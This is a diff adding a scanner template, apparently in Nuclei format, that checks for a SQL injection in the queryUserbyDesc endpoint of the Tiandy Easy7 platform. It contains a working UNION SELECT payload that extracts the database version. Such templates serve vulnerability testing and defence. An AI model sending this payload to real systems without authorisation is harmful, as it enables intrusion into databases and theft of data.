@@ -1,0 +1,30 @@
+id: tiandy-easy7-queryUserbyDesc-sqli
+info:
+  name: 天地伟业Easy7 queryUserbyDesc 存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 天地伟业Easy7平台queryUserbyDesc接口存在前台SQL注入漏洞，攻击者可获取数据库敏感信息。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/kvq21wld6szhf3w4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: tiandy,sqli
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/user/queryUserbyDesc?userDesc=1'+UNION+ALL+SELECT+CONCAT(0x7e,@@version,0x7e),41,41--+- HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'content')
+        condition: and
